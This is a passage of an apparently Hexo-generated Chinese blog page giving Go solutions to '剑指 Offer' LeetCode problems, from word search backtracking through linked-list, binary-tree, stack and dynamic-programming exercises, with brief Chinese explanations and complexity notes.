&#123;    rows, cols := len(board), len(board[0])    // 创建Visited数组    visited := make([][]bool, rows)    for i := range visited &#123;        visited[i] = make([]bool, cols)    &#125;    var find bool    for i := 0; i &lt; rows; i++ &#123;        for j := 0; j &lt; cols; j++ &#123;            backtracking(i, j, &amp;board, &amp;visited, &amp;word, 0, &amp;find)        &#125;    &#125;    return find&#125;func backtracking(row, col int, board *[][]byte, visited *[][]bool, word *string, idx int, find *bool) &#123;    if row &lt; 0 || row &gt;= len(*board) || col &lt; 0 || col &gt;= len((*board)[0]) &#123;        return    &#125;    if (*board)[row][col] != byte((*word)[idx]) || *find || (*visited)[row][col] &#123;        return    &#125;    if idx == len(*word)-1 &#123;        *find = true        return    &#125;    (*visited)[row][col] = true    backtracking(row+1, col, board, visited, word, idx+1, find)    backtracking(row-1, col, board, visited, word, idx+1, find)    backtracking(row, col+1, board, visited, word, idx+1, find)    backtracking(row, col-1, board, visited, word, idx+1, find)    (*visited)[row][col] = false&#125;</code></pre><h3 id="回溯优化"><a href="#回溯优化" class="headerlink" title="回溯优化"></a>回溯优化</h3><pre><code class="go">func exist(board [][]byte, word string) bool &#123;   m, n := len(board), len(board[0])   for i := 0; i &lt; m; i++ &#123;       for j := 0; j &lt; n; j++ &#123;            if dfs(board, i, j, 0, word) &#123;                return true            &#125;        &#125;    &#125;    return false&#125;func dfs(board [][]byte, row, col, level int, word string) bool &#123;    if level == len(word) &#123;        return true    &#125;    if row &lt; 0 || col &lt; 0 || row == len(board) || col == len(board[0]) &#123;        return false    &#125;    if board[row][col] != word[level] &#123;        return false    &#125;    temp := board[row][col]    board[row][col] = &#39; &#39; // 将数组元素改为空格来代替 Visited 数组的功能    if dfs(board, row, col + 1, level + 1, word) ||    dfs(board, row, col - 1, level + 1, word) ||    dfs(board, row + 1, col, level + 1, word) ||    dfs(board, row - 1, col, level + 1, word)  &#123;        return true    &#125;    board[row][col] = temp    return false&#125;</code></pre><h2 id="13-机器人的运动范围"><a href="#13-机器人的运动范围" class="headerlink" title="13. 机器人的运动范围"></a><a href="https://leetcode-cn.com/problems/ji-qi-ren-de-yun-dong-fan-wei-lcof/">13. 机器人的运动范围</a></h2><h3 id="DFS"><a href="#DFS" class="headerlink" title="DFS"></a>DFS</h3><pre><code class="go">func movingCount(m int, n int, k int) int &#123;    visited := make([][]bool, m)    for k := range visited &#123;        visited[k] = make([]bool, n)    &#125;    return dfs(m, n, k, 0, 0, visited)&#125;func dfs(m, n, k, row, col int, visited [][]bool) int &#123;    if row &gt;= m || col &gt;= n || visited[row][col] &#123;        return 0    &#125;    if row%10 + row/10 + col%10 + col/10 &gt; k &#123;        return 0    &#125;    visited[row][col] = true    return dfs(m, n, k, row, col+1, visited) + dfs(m, n, k, row+1, col, visited) + 1&#125;</code></pre><h2 id="14-I-剪绳子"><a href="#14-I-剪绳子" class="headerlink" title="14- I. 剪绳子"></a><a href="https://leetcode-cn.com/problems/jian-sheng-zi-lcof/">14- I. 剪绳子</a></h2><h3 id="数学"><a href="#数学" class="headerlink" title="数学"></a>数学</h3><pre><code class="go">func cuttingRope(n int) int &#123;    if n &lt;= 3 &#123;        return n-1    &#125;    sum := 1    for n &gt; 4 &#123;        sum *= 3        n-=3    &#125;    return sum*n&#125;</code></pre><h2 id="14-II-剪绳子-II"><a href="#14-II-剪绳子-II" class="headerlink" title="14- II. 剪绳子 II"></a><a href="https://leetcode-cn.com/problems/jian-sheng-zi-ii-lcof/">14- II. 剪绳子 II</a></h2><h3 id="数学-1"><a href="#数学-1" class="headerlink" title="数学"></a>数学</h3><pre><code class="go">func cuttingRope(n int) int &#123;    if n &lt;= 3 &#123;        return n-1    &#125;    sum := 1    for n &gt; 4 &#123;        sum *= 3        sum %= 1000000007        n-=3    &#125;    return sum*n % 1000000007&#125;</code></pre><h2 id="15-二进制中-1-的个数"><a href="#15-二进制中-1-的个数" class="headerlink" title="15. 二进制中 1 的个数"></a><a href="https://leetcode-cn.com/problems/er-jin-zhi-zhong-1de-ge-shu-lcof/">15. 二进制中 1 的个数</a></h2><h3 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h3><p>位运算，移位统计。</p><pre><code class="go">func hammingWeight(num uint32) int &#123;    count := 0    for i := 0; i &lt; 32; i++ &#123;        if num%2 == 1 &#123;            count++        &#125;        num = num &gt;&gt; 1    &#125;    return count&#125;</code></pre><h2 id="16-数值的整数次方"><a href="#16-数值的整数次方" class="headerlink" title="16. 数值的整数次方"></a><a href="https://leetcode-cn.com/problems/shu-zhi-de-zheng-shu-ci-fang-lcof/">16. 数值的整数次方</a></h2><h3 id="快速幂"><a href="#快速幂" class="headerlink" title="快速幂"></a>快速幂</h3><pre><code class="go">func myPow(x float64, n int) float64 &#123;    if n == 0 &#123;        return 1    &#125;    if n == 1 &#123;        return x    &#125;    if n == -1 &#123;        return 1/x    &#125;    mid := myPow(x, n/2)    return mid * mid * myPow(x, n%2)&#125;</code></pre><h2 id="17-打印从-1-到最大的-n-位数"><a href="#17-打印从-1-到最大的-n-位数" class="headerlink" title="17. 打印从 1 到最大的 n 位数"></a><a href="https://leetcode-cn.com/problems/da-yin-cong-1dao-zui-da-de-nwei-shu-lcof/">17. 打印从 1 到最大的 n 位数</a></h2><h3 id="不考虑大数"><a href="#不考虑大数" class="headerlink" title="不考虑大数"></a>不考虑大数</h3><pre><code class="go">func printNumbers(n int) []int &#123;    count := 1    for i := 0; i &lt; n; i++ &#123;        count *= 10    &#125;    result := make([]int, count - 1)    for i := range result &#123;        result[i] = i + 1    &#125;    return result&#125;</code></pre><h3 id="标准库"><a href="#标准库" class="headerlink" title="标准库"></a>标准库</h3><pre><code class="go">func printNumbers(n int) []int &#123;    res := make([]int, int(math.Pow(10, float64(n)))-1)    for i := range res &#123;        res[i] = i+1    &#125;    return res&#125;</code></pre><h2 id="18-删除链表的节点"><a href="#18-删除链表的节点" class="headerlink" title="18. 删除链表的节点"></a>18. <a href="https://leetcode-cn.com/problems/shan-chu-lian-biao-de-jie-dian-lcof/">删除链表的节点</a></h2><ul><li><p>虚拟结点</p><pre><code class="go">func deleteNode(head *ListNode, val int) *ListNode &#123;    dummy := new(ListNode)    dummy.Next = head    head = dummy    for head != nil &amp;&amp; head.Next != nil &#123;        if head.Next.Val == val &#123;            head.Next = head.Next.Next        &#125;        head = head.Next    &#125;    return dummy.Next&#125;</code></pre></li><li><p>递归</p><pre><code class="go">func deleteNode(head *ListNode, val int) *ListNode &#123;    if head == nil &#123;        return head    &#125;    if head.Val == val &#123;        return head.Next    &#125;    head.Next = deleteNode(head.Next, val)    return head&#125;</code></pre></li></ul><h2 id="21-调整数组顺序使奇数位于偶数前面"><a href="#21-调整数组顺序使奇数位于偶数前面" class="headerlink" title="21. 调整数组顺序使奇数位于偶数前面"></a>21. <a href="https://leetcode-cn.com/problems/diao-zheng-shu-zu-shun-xu-shi-qi-shu-wei-yu-ou-shu-qian-mian-lcof/">调整数组顺序使奇数位于偶数前面</a></h2><ul><li><p>头尾双指针</p><pre><code class="go">func exchange(nums []int) []int &#123;    low, high := 0, len(nums) - 1    for low &lt; high &#123;        if nums[high] % 2 == 0 &#123;            high--        &#125;        if nums[low] % 2 != 0 &#123;            low++        &#125;        if low &lt; high &amp;&amp; nums[low] % 2 == 0 &amp;&amp; nums[high] % 2 != 0 &#123;            nums[low], nums[high] = nums[high], nums[low]        &#125;    &#125;    return nums&#125;</code></pre></li></ul><h2 id="22-链表中倒数第-k-个节点"><a href="#22-链表中倒数第-k-个节点" class="headerlink" title="22. 链表中倒数第 k 个节点"></a><a href="https://leetcode-cn.com/problems/lian-biao-zhong-dao-shu-di-kge-jie-dian-lcof/">22. 链表中倒数第 k 个节点</a></h2><h3 id="计算长度"><a href="#计算长度" class="headerlink" title="计算长度"></a>计算长度</h3><p>由于是倒数 k 个节点，因此可以先遍历一遍链表得到链表长度，再减去 k 得到结果链表的起始位置，最后将从该位置开始的链表返回即可。</p><p>$O(n)$|$O(1)$</p><pre><code class="go">func getKthFromEnd(head *ListNode, k int) *ListNode &#123;    count := 0    p := head    for p != nil &#123;        count++        p = p.Next    &#125;    if count &lt; k &#123;        return nil    &#125;    for i := 0; i &lt;count-k; i++&#123;        head = head.Next    &#125;    return head&#125;</code></pre><h3 id="双指针"><a href="#双指针" class="headerlink" title="双指针"></a>双指针</h3><p>首先遍历到链表第 k 个节点，然后再用一个指针去从头遍历，第二个指针遍历的过程中第一个指针也同步往后移动，直到指向末尾，返回第二个指针。<br>$O(n)$|$O(1)$</p><pre><code class="go">func getKthFromEnd(head *ListNode, k int) *ListNode &#123;    slow, fast := head, head    for k &gt; 0 &#123;        fast = fast.Next        k--    &#125;    for fast != nil &#123;        slow = slow.Next        fast = fast.Next    &#125;    return slow&#125;</code></pre><h2 id="23-反转链表"><a href="#23-反转链表" class="headerlink" title="23. 反转链表"></a>23. <a href="https://leetcode-cn.com/problems/fan-zhuan-lian-biao-lcof/">反转链表</a></h2><h3 id="Ideas-2"><a href="#Ideas-2" class="headerlink" title="Ideas"></a>Ideas</h3><ul><li>记录前一结点，遍历链表修改结点</li></ul><h3 id="Solutions-3"><a href="#Solutions-3" class="headerlink" title="Solutions"></a>Solutions</h3><ul><li><p>preNode</p><pre><code class="go">func reverseList(head *ListNode) *ListNode &#123;    if head == nil &#123;        return head    &#125;    var pre, next *ListNode    for &#123;        next = head.Next        head.Next = pre        if next == nil &#123;            break        &#125;        pre = head        head = next    &#125;    return head&#125;</code></pre></li></ul><h2 id="25-合并两个排序的链表"><a href="#25-合并两个排序的链表" class="headerlink" title="25. 合并两个排序的链表"></a><a href="https://leetcode-cn.com/problems/he-bing-liang-ge-pai-xu-de-lian-biao-lcof/">25. 合并两个排序的链表</a></h2><h3 id="递归-1"><a href="#递归-1" class="headerlink" title="递归"></a>递归</h3><pre><code class="go">/** * Definition for singly-linked list. * type ListNode struct &#123; *     Val int *     Next *ListNode * &#125; */func mergeTwoLists(l1 *ListNode, l2 *ListNode) *ListNode &#123;    if l1 == nil &#123;        return l2    &#125;    if l2 == nil &#123;        return l1    &#125;    if l1.Val &lt;= l2.Val &#123;        l1.Next = mergeTwoLists(l1.Next, l2)        return l1    &#125; else &#123;        l2.Next = mergeTwoLists(l1, l2.Next)        return l2    &#125;&#125;</code></pre><h2 id="26-树的子结构"><a href="#26-树的子结构" class="headerlink" title="26. 树的子结构"></a><a href="https://leetcode-cn.com/problems/shu-de-zi-jie-gou-lcof/">26. 树的子结构</a></h2><h3 id="递归-2"><a href="#递归-2" class="headerlink" title="递归"></a>递归</h3><ul><li>时间复杂度：$O(mn)$</li><li>空间复杂度：$O(m)$</li></ul><blockquote><p>m 为 A 树规模，n 为 B 树规模</p></blockquote><pre><code class="go">/** * Definition for a binary tree node. * type TreeNode struct &#123; *     Val int *     Left *TreeNode *     Right *TreeNode * &#125; */func isSubStructure(A *TreeNode, B *TreeNode) bool &#123;    if A == nil || B == nil &#123;        return false    &#125;    // 判断当前结点、递归左子树、递归右子树    return subTree(A, B) || isSubStructure(A.Left, B) || isSubStructure(A.Right, B)&#125;// 判断 B 是否是 A 包含根节点的子树func subTree(A *TreeNode, B *TreeNode) bool &#123;    if B == nil &#123;        // B 递归完毕        return true    &#125;    if A == nil || A.Val != B.Val &#123;        // A 递归完毕或 A B 当前结点不相等        return false    &#125;    // 往左右子树分别递归判断    return subTree(A.Left, B.Left) &amp;&amp; subTree(A.Right, B.Right)&#125;</code></pre><h2 id="27-二叉树的镜像"><a href="#27-二叉树的镜像" class="headerlink" title="27. 二叉树的镜像"></a><a href="https://leetcode-cn.com/problems/er-cha-shu-de-jing-xiang-lcof/">27. 二叉树的镜像</a></h2><h3 id="递归-3"><a href="#递归-3" class="headerlink" title="递归"></a>递归</h3><pre><code class="go">/** * Definition for a binary tree node. * type TreeNode struct &#123; *     Val int *     Left *TreeNode *     Right *TreeNode * &#125; */func mirrorTree(root *TreeNode) *TreeNode &#123;    if root == nil &#123;        return nil    &#125;    root.Left, root.Right = root.Right, root.Left    // 交换左右子树    mirrorTree(root.Left)    mirrorTree(root.Right)    return root&#125;</code></pre><h3 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h3><pre><code class="go">/** * Definition for a binary tree node. * type TreeNode struct &#123; *     Val int *     Left *TreeNode *     Right *TreeNode * &#125; */func mirrorTree(root *TreeNode) *TreeNode &#123;    if root == nil &#123;        return nil    &#125;    queue := []*TreeNode&#123;root&#125;    for len(queue) &gt; 0 &#123;        node := queue[0]        queue = queue[1:]        node.Left, node.Right = node.Right, node.Left        if node.Left != nil &#123;            queue = append(queue, node.Left)        &#125;        if node.Right != nil &#123;            queue = append(queue, node.Right)        &#125;    &#125;    return root&#125;</code></pre><h2 id="28-对称的二叉树"><a href="#28-对称的二叉树" class="headerlink" title="28. 对称的二叉树"></a><a href="https://leetcode-cn.com/problems/dui-cheng-de-er-cha-shu-lcof/">28. 对称的二叉树</a></h2><h3 id="递归（DFS）"><a href="#递归（DFS）" class="headerlink" title="递归（DFS）"></a>递归（DFS）</h3><pre><code class="go">func isSymmetric(root *TreeNode) bool &#123;    if root == nil &#123;        return true    &#125;    return helper(root.Left, root.Right)&#125;func helper(left, right *TreeNode) bool &#123;    if left == nil &amp;&amp; right == nil &#123;        return true    &#125;    if left == nil || right == nil &#123;        return false    &#125;    if left.Val != right.Val &#123;        return false    &#125;    return helper(left.Left, right.Right) &amp;&amp; helper(left.Right, right.Left)&#125;</code></pre><h2 id="29-顺时针打印矩阵"><a href="#29-顺时针打印矩阵" class="headerlink" title="29. 顺时针打印矩阵"></a><a href="https://leetcode-cn.com/problems/shun-shi-zhen-da-yin-ju-zhen-lcof/">29. 顺时针打印矩阵</a></h2><h3 id="模拟"><a href="#模拟" class="headerlink" title="模拟"></a>模拟</h3><p>模拟路径、缩小边界即可。</p><ul><li>时间复杂度：$O(mn)$</li><li>空间复杂度：$O(1)$</li></ul><blockquote><p>m 和 n 分别为行和列的长度，result 数组为必须使用的空间，因此空间复杂度为$O(1)$</p></blockquote><pre><code class="go">func spiralOrder(matrix [][]int) []int &#123;    if len(matrix) == 0 &#123;        // 边界判断        return nil    &#125;    // 存储结果    result := make([]int, len(matrix) * len(matrix[0]))    index := 0    // 限制边界    rowMin, rowMax, colMin, colMax := 0, len(matrix), 0, len(matrix[0])    for &#123;        // 左 -&gt; 右        for i := colMin; i &lt; colMax; i++ &#123;            result[index] = matrix[rowMin][i]            index++        &#125;        rowMin++        if rowMin &gt;= rowMax &#123;            break        &#125;        // 上 -&gt; 下        for i := rowMin; i &lt; rowMax; i++ &#123;            result[index] = matrix[i][colMax-1]            index++        &#125;        colMax--        if colMin &gt;= colMax &#123;            break        &#125;        // 右 -&gt; 左        for i := colMax-1; i &gt;= colMin; i-- &#123;            result[index] = matrix[rowMax-1][i]            index++        &#125;        rowMax--        if rowMin &gt;= rowMax &#123;            break        &#125;        // 下 -&gt; 上        for i := rowMax-1; i &gt;= rowMin; i-- &#123;            result[index] = matrix[i][colMin]            index++        &#125;        colMin++        if colMin &gt;= colMax &#123;            break        &#125;    &#125;    return result&#125;</code></pre><h2 id="30-包含-min-函数的栈"><a href="#30-包含-min-函数的栈" class="headerlink" title="30. 包含 min 函数的栈"></a>30. <a href="https://leetcode-cn.com/problems/bao-han-minhan-shu-de-zhan-lcof/">包含 min 函数的栈</a></h2><h3 id="Ideas-3"><a href="#Ideas-3" class="headerlink" title="Ideas"></a>Ideas</h3><ul><li>使用<strong>辅助栈</strong>，push 时将更小的值放入辅助栈，pop 时当二者栈顶一致时弹出辅助栈栈顶元素。</li></ul><h3 id="Solutions-4"><a href="#Solutions-4" class="headerlink" title="Solutions"></a>Solutions</h3><ul><li><p>辅助栈</p><pre><code class="go">type MinStack struct &#123;    Nums []int    Helper []int&#125;/** initialize your data structure here. */func Constructor() MinStack &#123;    return MinStack&#123;make([]int, 0), make([]int, 0)&#125;&#125;func (this *MinStack) Push(x int)  &#123;    if len(this.Helper) == 0 || x &lt;= this.Helper[len(this.Helper)-1] &#123;    this.Helper = append(this.Helper, x)    &#125;    this.Nums = append(this.Nums, x)&#125;func (this *MinStack) Pop()  &#123;    num := this.Nums[len(this.Nums)-1]    hnum := this.Helper[len(this.Helper)-1]    this.Nums = this.Nums[:len(this.Nums)-1]    if num == hnum &#123;        this.Helper = this.Helper[:len(this.Helper)-1]    &#125;&#125;func (this *MinStack) Top() int &#123;    return this.Nums[len(this.Nums)-1]&#125;func (this *MinStack) Min() int &#123;    return this.Helper[len(this.Helper)-1]&#125;/** * Your MinStack object will be instantiated and called as such: * obj := Constructor(); * obj.Push(x); * obj.Pop(); * param_3 := obj.Top(); * param_4 := obj.Min(); */</code></pre></li></ul><h2 id="31-栈的压入、弹出序列"><a href="#31-栈的压入、弹出序列" class="headerlink" title="31. 栈的压入、弹出序列"></a><a href="https://leetcode-cn.com/problems/zhan-de-ya-ru-dan-chu-xu-lie-lcof/">31. 栈的压入、弹出序列</a></h2><h3 id="模拟-1"><a href="#模拟-1" class="headerlink" title="模拟"></a>模拟</h3><ul><li>时间复杂度：$O(n)$</li><li>空间复杂度：$O(n)$</li></ul><pre><code class="go">func validateStackSequences(pushed []int, popped []int) bool &#123;    stack := make([]int, 0)    // 模拟栈    for i := range pushed &#123;        stack = append(stack, pushed[i]) // 压栈        for len(popped) &gt; 0 &amp;&amp; len(stack) &gt; 0 &amp;&amp; stack[len(stack)-1] == popped[0] &#123;            // 循环出栈            stack = stack[:len(stack)-1]            popped = popped[1:]        &#125;    &#125;    return len(stack) == 0&#125;</code></pre><h2 id="32-I-从上到下打印二叉树"><a href="#32-I-从上到下打印二叉树" class="headerlink" title="32 - I. 从上到下打印二叉树"></a><a href="https://leetcode-cn.com/problems/cong-shang-dao-xia-da-yin-er-cha-shu-lcof/">32 - I. 从上到下打印二叉树</a></h2><h3 id="层序遍历"><a href="#层序遍历" class="headerlink" title="层序遍历"></a>层序遍历</h3><ul><li>时间复杂度：$O(n)$</li><li>空间复杂度：$O(n)$</li></ul><pre><code class="go">/** * Definition for a binary tree node. * type TreeNode struct &#123; *     Val int *     Left *TreeNode *     Right *TreeNode * &#125; */func levelOrder(root *TreeNode) []int &#123;    if root == nil &#123;        return []int&#123;&#125;    &#125;    queue := []*TreeNode&#123;root&#125;    // 队列    result := make([]int, 0)    // 存放结果    for len(queue) &gt; 0 &#123;        root := queue[0]        if root.Left != nil &#123;            queue = append(queue, root.Left)        &#125;        if root.Right != nil &#123;            queue = append(queue, root.Right)        &#125;        result = append(result, root.Val)        queue = queue[1:]    &#125;    return result&#125;</code></pre><h2 id="32-II-从上到下打印二叉树-II"><a href="#32-II-从上到下打印二叉树-II" class="headerlink" title="32 - II. 从上到下打印二叉树 II"></a><a href="https://leetcode-cn.com/problems/cong-shang-dao-xia-da-yin-er-cha-shu-ii-lcof/">32 - II. 从上到下打印二叉树 II</a></h2><h3 id="层序遍历-1"><a href="#层序遍历-1" class="headerlink" title="层序遍历"></a>层序遍历</h3><ul><li>时间复杂度：</li><li>空间复杂度：</li></ul><pre><code class="go">/** * Definition for a binary tree node. * type TreeNode struct &#123; *     Val int *     Left *TreeNode *     Right *TreeNode * &#125; */func levelOrder(root *TreeNode) [][]int &#123;    if root == nil &#123;        return [][]int&#123;&#125;    &#125;    queue := []*TreeNode&#123;root&#125;    result := make([][]int, 0)    for len(queue) &gt; 0 &#123;        tmp := make([]int, 0)    // 单层结点值        for i := len(queue); i &gt; 0; i-- &#123;            // 出队            node := queue[0]            queue = queue[1:]            tmp = append(tmp, node.Val)            if node.Left != nil &#123;                queue = append(queue, node.Left)            &#125;            if node.Right != nil &#123;                queue = append(queue, node.Right)            &#125;        &#125;        result = append(result, tmp)    &#125;    return result&#125;</code></pre><h2 id="32-III-从上到下打印二叉树-III"><a href="#32-III-从上到下打印二叉树-III" class="headerlink" title="32 - III. 从上到下打印二叉树 III*"></a><a href="https://leetcode-cn.com/problems/cong-shang-dao-xia-da-yin-er-cha-shu-iii-lcof/">32 - III. 从上到下打印二叉树 III</a>*</h2><h3 id="双端队列"><a href="#双端队列" class="headerlink" title="双端队列"></a>双端队列</h3><pre><code class="go">/** * Definition for a binary tree node. * type TreeNode struct &#123; *     Val int *     Left *TreeNode *     Right *TreeNode * &#125; */func levelOrder(root *TreeNode) [][]int &#123;    if root == nil &#123;        return [][]int&#123;&#125;    &#125;    queue := []*TreeNode&#123;root&#125;    result := make([][]int, 0)    for len(queue) &gt; 0 &#123;        tmp := make([]int, 0)        for i := len(queue); i &gt; 0; i-- &#123;            node := queue[0]            queue = queue[1:]            if node.Left != nil &#123;                queue = append(queue, node.Left)            &#125;            if node.Right != nil &#123;                queue = append(queue, node.Right)            &#125;            tmp = append(tmp, node.Val)        &#125;        result = append(result, tmp)        if len(queue) == 0 &#123;            break        &#125;        tmp = make([]int, 0)        for i := len(queue); i &gt; 0; i-- &#123;            node := queue[len(queue)-1]            queue = queue[:len(queue)-1]            if node.Right != nil &#123;                queue = append([]*TreeNode&#123;node.Right&#125;, queue...)            &#125;            if node.Left != nil &#123;                queue = append([]*TreeNode&#123;node.Left&#125;, queue...)            &#125;            tmp = append(tmp, node.Val)        &#125;        result = append(result, tmp)    &#125;    return result&#125;</code></pre><h2 id="33-二叉搜索树的后序遍历序列"><a href="#33-二叉搜索树的后序遍历序列" class="headerlink" title="33. 二叉搜索树的后序遍历序列"></a><a href="https://leetcode-cn.com/problems/er-cha-sou-suo-shu-de-hou-xu-bian-li-xu-lie-lcof/">33. 二叉搜索树的后序遍历序列</a></h2><h3 id="递归-4"><a href="#递归-4" class="headerlink" title="递归"></a>递归</h3><p>思路是后序遍历最右结点为根结点，其左边第一个大于根结点的值后面的值也必定大于根结点，如不满足则返回<code>false</code>，递归由此切分的左右子树，当子树只有一个结点则返回<code>true</code>。</p><pre><code class="go">func verifyPostorder(postorder []int) bool &#123;   return verify(postorder, 0, len(postorder)-1)&#125;func verify(postorder []int, left, right int) bool &#123;    if left &gt;= right &#123;        return true    &#125;    tmp := left    for postorder[tmp] &lt; postorder[right] &#123;        tmp++    &#125;    for _, v := range postorder[tmp:right] &#123;        if v &lt; postorder[right] &#123;            return false        &#125;    &#125;    return verify(postorder, left, tmp-1) &amp;&amp; verify(postorder, tmp, right-1)&#125;</code></pre><h2 id="34-二叉树中和为某一值的路径"><a href="#34-二叉树中和为某一值的路径" class="headerlink" title="34. 二叉树中和为某一值的路径"></a><a href="https://leetcode-cn.com/problems/er-cha-shu-zhong-he-wei-mou-yi-zhi-de-lu-jing-lcof/">34. 二叉树中和为某一值的路径</a></h2><h3 id="回溯（DFS）"><a href="#回溯（DFS）" class="headerlink" title="回溯（DFS）"></a>回溯（DFS）</h3><p>回溯法，设置一个二维列表<code>res</code>存储结果，设置一个列表<code>tmp</code>存放当前路径。</p><pre><code class="go">func pathSum(root *TreeNode, target int) [][]int &#123;    res := make([][]int, 0)    tmp := make([]int, 0)    backtracking(root, target, &amp;res, &amp;tmp)    return res&#125;func backtracking(root *TreeNode, target int, res *[][]int, tmp *[]int) &#123;    if root == nil &#123;        return    &#125;    target -= root.Val    *tmp = append(*tmp, root.Val)    if target == 0 &amp;&amp; root.Left == nil &amp;&amp; root.Right == nil &#123;        // 深拷贝，防止共用底层数组导致结果重复        dest := make([]int, len(*tmp))        copy(dest, *tmp)        *res = append(*res, dest)    &#125;    backtracking(root.Left, target, res, tmp)    backtracking(root.Right, target, res, tmp)    *tmp = (*tmp)[:len(*tmp)-1]&#125;</code></pre><h2 id="35-复杂链表的复制"><a href="#35-复杂链表的复制" class="headerlink" title="35. 复杂链表的复制*"></a><a href="https://leetcode-cn.com/problems/fu-za-lian-biao-de-fu-zhi-lcof/">35. 复杂链表的复制</a>*</h2><h3 id="哈希表"><a href="#哈希表" class="headerlink" title="哈希表"></a>哈希表</h3><p>哈希表的思路是用一个哈希表存储原链表结点和新链表结点的对应关系，然后将<code>Next</code>和<code>Random</code>属性复制过去。</p><ul><li>时间复杂度：$O(n)$</li><li>空间复杂度：$O(n)$</li></ul><pre><code class="go">/** * Definition for a Node. * type Node struct &#123; *     Val int *     Next *Node *     Random *Node * &#125; */func copyRandomList(head *Node) *Node &#123;    if head == nil &#123;        return nil    &#125;    m := make(map[*Node]*Node)    for cur := head; cur != nil; cur = cur.Next &#123;        m[cur] = &amp;Node&#123;cur.Val, nil, nil&#125;    &#125;    for cur := head; cur != nil; cur = cur.Next &#123;        m[cur].Next = m[cur.Next]        m[cur].Random = m[cur.Random]    &#125;    return m[head]&#125;</code></pre><h2 id="38-字符串的排列"><a href="#38-字符串的排列" class="headerlink" title="38. 字符串的排列"></a><a href="https://leetcode-cn.com/problems/zi-fu-chuan-de-pai-lie-lcof/">38. 字符串的排列</a></h2><h3 id="回溯（DFS）-1"><a href="#回溯（DFS）-1" class="headerlink" title="回溯（DFS）"></a>回溯（DFS）</h3><p>使用标准的回溯加上<code>visited</code>数组去重可以完成字符串的所有排列，但当输入的字符串中存在重复字符，结果集就会有重复。需要在同一层判断重复元素并跳过。可以先对字符串进行字符排序，让重复字符位置连续。</p><pre><code class="go">func permutation(s string) []string &#123;    // 排序字符串    t := []byte(s)    sort.Slice(t, func(a, b int) bool &#123;return t[a] &lt; t[b]&#125;)    s = string(t)    res := make([]string, 0)    // 结果集    visited := make([]bool, len(s))    // 判断是否访问    dfs(s, &quot;&quot;, &amp;res, visited)    return res&#125;func dfs(s, tmp string, res *[]string, visited []bool) &#123;    if len(tmp) == len(s) &#123;        *res = append(*res, tmp)        return    &#125;    for i := 0; i &lt; len(s); i++ &#123;        if visited[i] || (i &gt; 0 &amp;&amp; s[i-1] == s[i] &amp;&amp; !visited[i-1]) &#123;            continue        &#125;        visited[i] = true        dfs(s, tmp + s[i:i+1], res, visited)        visited[i] = false    &#125;&#125;</code></pre><h2 id="39-数组中出现次数超过一半的数字"><a href="#39-数组中出现次数超过一半的数字" class="headerlink" title="39. 数组中出现次数超过一半的数字"></a><a href="https://leetcode-cn.com/problems/shu-zu-zhong-chu-xian-ci-shu-chao-guo-yi-ban-de-shu-zi-lcof/">39. 数组中出现次数超过一半的数字</a></h2><h3 id="摩尔投票法"><a href="#摩尔投票法" class="headerlink" title="摩尔投票法"></a>摩尔投票法</h3><p>由于需要找到的数字的出现次数超过数组大小的一半，因此可以将不相等的数字从数组中剔除，最终留下的就是众数。基于这个思路简化的<strong>摩尔投票法</strong>设定一个变量，当选中的两个数字不等则将该变量-1 操作，相等则+1。</p><pre><code class="go">func majorityElement(nums []int) int &#123;    num, sum := 0, 0    for _, v := range nums &#123;        if sum == 0 &#123;            num = v        // 当sum为0重新设置众数        &#125;        if v != num &#123;            sum--        &#125; else &#123;            sum++        &#125;    &#125;    return num&#125;</code></pre><h2 id="40-最小的-k-个数"><a href="#40-最小的-k-个数" class="headerlink" title="40. 最小的 k 个数"></a>40. <a href="https://leetcode-cn.com/problems/zui-xiao-de-kge-shu-lcof/">最小的 k 个数</a></h2><h3 id="Ideas-4"><a href="#Ideas-4" class="headerlink" title="Ideas"></a>Ideas</h3><ul><li>排序</li><li>大根堆</li></ul><h3 id="Solutions-5"><a href="#Solutions-5" class="headerlink" title="Solutions"></a>Solutions</h3><h2 id="42-连续子数组的最大和"><a href="#42-连续子数组的最大和" class="headerlink" title="42. 连续子数组的最大和"></a><a href="https://leetcode-cn.com/problems/lian-xu-zi-shu-zu-de-zui-da-he-lcof/">42. 连续子数组的最大和</a></h2><h3 id="动态规划-2"><a href="#动态规划-2" class="headerlink" title="动态规划"></a>动态规划</h3><ul><li>时间复杂度：$O(n)$</li><li>空间复杂度：$O(n)$</li></ul><pre><code class="go">func maxSubArray(nums []int) int &#123;    dp := make([]int, len(nums))    dp[0] = nums[0]    maxNum := dp[0]    for i := 1; i &lt; len(nums); i++ &#123;        dp[i] = max(dp[i-1] + nums[i], nums[i])        if dp[i] &gt; maxNum &#123;            maxNum = dp[i]        &#125;    &#125;    return maxNum&#125;func max(a, b int) int &#123;    if a &gt; b &#123;        return a    &#125;    return b&#125;</code></pre><h3 id="动态规划（OPT）"><a href="#动态规划（OPT）" class="headerlink" title="动态规划（OPT）"></a>动态规划（OPT）</h3><ul><li>时间复杂度：$O(n)$</li><li>空间复杂度：$O(1)$</li></ul><pre><code class="go">func maxSubArray(nums []int) int &#123;    pre, post := nums[0], 0    maxNum := pre    for i := 1; i &lt; len(nums); i++ &#123;        pre, post = post, max(pre + nums[i], nums[i])        maxNum = max(maxNum, post)    &#125;    return maxNum&#125;func max(a, b int) int &#123;    if a &gt; b &#123;        return a    &#125;    return b&#125;</code></pre><h2 id="47-礼物的最大价值"><a href="#47-礼物的最大价值" class="headerlink" title="47. 礼物的最大价值"></a><a href="https://leetcode-cn.com/problems/li-wu-de-zui-da-jie-zhi-lcof/">47. 礼物的最大价值</a></h2><h3 id="动态规划-3"><a href="#动态规划-3" class="headerlink" title="动态规划"></a>动态规划</h3><p>遍历整个矩阵，从上到下填充当前路径的最大值。</p><ul><li>时间复杂度：$O(mn)$</li><li>空间复杂度：$O(1)$</li></ul><pre><code class="go">func maxValue(grid [][]int) int &#123;    for i := range grid &#123;        for j := range grid[0] &#123;            if i == 0 &amp;&amp; j &gt; 0 &#123;                grid[i][j] += grid[i][j-1]            &#125; else if i &gt; 0 &amp;&amp; j == 0 &#123;                grid[i][j] += grid[i-1][j]            &#125; else if i &gt; 0 &amp;&amp; j &gt; 0 &#123;                grid[i][j] += max(grid[i-1][j], grid[i][j-1])            &#125;        &#125;    &#125;    return grid[len(grid)-1][len(grid[0])-1]&#125;func max(a, b int) int &#123;    if a &gt; b &#123;        return a    &#125;    return b&#125;</code></pre><h2 id="49-丑数"><a href="#49-丑数" class="headerlink" title="49. 